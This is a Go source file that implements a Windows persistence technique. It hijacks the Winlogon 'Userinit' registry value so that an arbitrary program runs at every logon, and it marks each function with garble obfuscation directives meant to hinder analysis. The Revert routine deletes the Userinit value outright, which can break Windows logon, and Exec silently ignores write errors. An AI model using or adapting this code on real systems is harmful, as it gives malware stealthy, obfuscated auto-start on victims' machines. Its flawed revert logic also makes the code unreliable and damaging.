// Copyright (c) 2019-2022 0x9ef. All rights reserved.
// Use of this source code is governed by an MIT license
// that can be found in the LICENSE file.
package persist

import (
	"errors"
	"path/filepath"
	"syscall"

	"golang.org/x/sys/windows/registry"
)

type ExecutorUserinit struct{}
//garble:controlflow flatten_passes=max junk_jumps=max block_splits=max flatten_hardening=xor,delegate_table
func (e ExecutorUserinit) findPath() (string, error) {
	path, exists := syscall.Getenv("SYSTEMROOT")
	if !exists {
		return "<nil>", errors.New("cannot lookup SYSTEMROOT")
	}
	return path, nil
}
//garble:controlflow flatten_passes=max junk_jumps=max block_splits=max flatten_hardening=xor,delegate_table
func (e ExecutorUserinit) Exec(path string) error {
	sysdir, err := e.findPath()
	if err != nil {
		return err
	}
	kpath := filepath.Join(sysdir, "system32", "userinit.exe,"+path)
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, "Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", registry.ALL_ACCESS)
	if err != nil {
		return err
	}
	defer k.Close()
	err = k.SetStringValue("Userinit", kpath)
	return nil
}
//garble:controlflow flatten_passes=max junk_jumps=max block_splits=max flatten_hardening=xor,delegate_table
func (e ExecutorUserinit) Revert() error {
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, "Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", registry.ALL_ACCESS)
	if err != nil {
		return err
	}
	defer k.Close()
	err = k.DeleteValue("Userinit")
	return err
}
